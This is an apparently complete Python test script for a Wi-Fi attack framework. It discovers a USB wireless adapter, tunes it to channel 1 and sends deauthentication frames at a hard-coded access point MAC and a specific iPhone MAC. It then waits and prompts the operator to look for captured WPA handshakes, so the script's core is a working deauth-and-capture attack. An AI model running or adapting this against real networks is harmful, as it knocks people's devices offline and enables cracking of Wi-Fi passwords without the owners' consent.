import argparse
import asyncio
import logging
import sys
from pathlib import Path

# Add src to path
sys.path.append(str(Path(__file__).parent.parent / "src"))

from wifit3.wlan.manager import WlanDeviceManager

async def test_hw(debug: bool = False):
    level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(levelname)-5s %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )
    print(f"[*] Starting Framework Hardware Test... (debug={debug})")
    
    manager = WlanDeviceManager()
    
    print("[*] Refreshing interfaces (Discovery & Boot)...")
    interfaces = await manager.refresh()
    
    if not interfaces:
        print("[-] No supported interfaces found.")
        return

    iface = interfaces[0]
    print(f"[+] Found interface: {iface.name} ({iface.description})")

    print("[*] Connecting (HTC/WMI Handshake)...")
    await iface.connect()
    
    # The reader loop is now running, and usb_transactions.log should be filling up.
    
    print("[*] Attempting to set Channel 1...")
    success = await iface.set_channel(1)
    if success:
        print("[+] Successfully tuned to Channel 1!")
    else:
        print("[-] Failed to tune to Channel 1.")
        
    print("[*] Waiting 2 seconds to gather targets...")
    await asyncio.sleep(2)
    
    print("[*] Firing Deauth test...")
    # Using the specific AP and iPhone MACs
    await iface.deauth("aa:bb:cc:dd:ee:01", "04:2E:C1:51:43:B8")

    print("[*] Waiting 15 seconds to observe traffic (look for handshakes!)...")
    await asyncio.sleep(15)

    print("[*] Closing interface...")
    await iface.close()
    print("[+] Test complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--debug", action="store_true",
                        help="enable DEBUG logging (frame bytes, bulk-OUT sizes, etc.)")
    args = parser.parse_args()
    try:
        asyncio.run(test_hw(debug=args.debug))
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[-] Test failed with error: {e}")
        import traceback
        traceback.print_exc()
